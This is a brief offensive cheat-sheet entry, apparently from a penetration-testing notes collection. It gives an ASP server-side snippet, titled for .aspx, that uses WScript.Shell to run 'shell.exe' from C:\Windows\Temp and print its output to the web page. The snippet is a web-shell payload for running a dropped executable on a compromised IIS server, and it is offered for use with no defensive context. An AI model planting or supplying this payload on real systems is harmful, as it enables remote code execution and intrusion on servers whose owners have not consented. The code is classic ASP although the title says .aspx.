# Active Sever Pages Extended (.aspx) Execute a File
```
<% 
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c C:\Windows\Temp\shell.exe")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

# References

Tags:
    #assorted
